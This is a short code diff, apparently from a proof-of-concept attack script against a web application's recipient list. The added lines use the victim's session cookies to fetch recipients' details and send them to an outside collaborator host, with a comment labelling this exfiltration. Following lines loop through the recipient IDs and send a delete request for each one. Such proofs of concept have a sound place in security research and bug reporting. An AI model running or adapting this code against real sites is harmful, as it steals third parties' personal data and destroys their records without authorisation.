@@ -4,6 +4,11 @@
       credentials: "include"
     });
     const json = await res.json();
+    
+    // Exfiltrate the recipients' details to your server
+    await fetch("https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/?data=" + encodeURIComponent(JSON.stringify(json)));
+
+    // Loop the IDs and delete each recipient
     const ids = json.data.map(x => x.Recipient_ID);
     for (const id of ids) {
       await fetch(`https://app.phished.io/en/users/recipients/${id}/delete`, {
